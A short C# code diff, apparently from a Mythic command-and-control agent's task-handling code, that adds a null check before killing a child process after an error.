@@ -214,7 +214,7 @@ namespace Tasks
                     resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                if (!proc.HasExited)
+                if (proc != null && !proc.HasExited)
                 {
                     proc.Kill();
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true, "", new IMythicMessage[]
